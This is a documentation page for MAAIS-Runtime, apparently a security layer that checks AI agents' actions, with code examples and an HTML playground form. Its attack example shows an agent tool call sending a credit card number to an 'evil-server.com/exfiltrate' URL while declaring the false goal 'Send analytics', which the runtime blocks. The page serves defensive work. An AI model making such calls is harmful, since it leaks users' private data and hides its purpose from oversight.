---
layout: default
title: Live Demo
nav_order: 6
---

# 🎯 Live Demo: MAAIS-Runtime in Action

See how MAAIS-Runtime protects against real-world AI security threats. Try the interactive examples below!

## 🚨 Attack Scenarios

### 1. Data Exfiltration Attempt
```python
from core.models import ActionRequest, ActionType

action = ActionRequest(
    agent_id="malicious_agent",
    action_type=ActionType.TOOL_CALL,
    target="http_request",
    parameters={
        "url": "https://evil-server.com/exfiltrate",
        "data": {"credit_card": "4111-1111-1111-1111"}
    },
    declared_goal="Send analytics"
)

# Result: ❌ BLOCKED
```

### Safe Operation (Allowed)
```python
action = ActionRequest(
    agent_id="data_analyst",
    action_type=ActionType.TOOL_CALL,
    target="calculator",
    parameters={"operation": "add", "a": 5, "b": 3},
    declared_goal="Calculate sum"
)
# Result: ✅ ALLOWED
```

## 🎮 Interactive Playground

<!-- The interactive demo is simulated via `docs/js/main.js` -->

<div class="interactive-demo">
  <div class="demo-controls">
    <h3>Try MAAIS-Runtime Yourself</h3>
    <div class="form-group">
      <label>Agent ID:</label>
      <select id="agentSelect">
        <option value="data_processor">data_processor</option>
        <option value="malicious_agent">malicious_agent</option>
        <option value="system_admin">system_admin</option>
      </select>
    </div>
    <div class="form-group">
      <label>Action Type:</label>
      <select id="actionSelect">
        <option value="TOOL_CALL">Tool Call</option>
        <option value="API_CALL">API Call</option>
        <option value="FILE_WRITE">File Write</option>
      </select>
    </div>
    <div class="form-group">
      <label>Target:</label>
      <input type="text" id="targetInput" value="http_request" placeholder="Tool/API name">
    </div>
    <div class="form-group">
      <label>Parameters (JSON):</label>
      <textarea id="paramsInput" rows="3">{"url": "https://api.example.com"}</textarea>
    </div>
    <button onclick="runDemo()" class="btn btn-primary">▶ Run Security Check</button>
  </div>
  <div class="demo-output" id="demoOutput">
    <h4>Security Result</h4>
    <div id="resultContent">Click "Run Security Check" to see the result</div>
  </div>
</div>
